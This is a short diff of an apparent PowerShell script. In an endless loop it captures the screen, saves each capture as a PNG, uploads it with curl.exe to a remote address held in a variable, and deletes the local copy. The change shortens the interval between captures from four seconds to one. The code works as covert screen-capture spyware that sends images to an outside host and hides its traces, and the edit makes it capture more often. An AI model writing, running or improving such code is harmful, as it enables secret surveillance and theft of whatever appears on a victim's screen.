@@ -92,7 +92,7 @@ while ($true) {
             $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
             $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
             curl.exe -F "file1=@$filett" $dc
-            sleep 4
+            sleep 1
             Remove-Item -Path $Filett
         }
     }
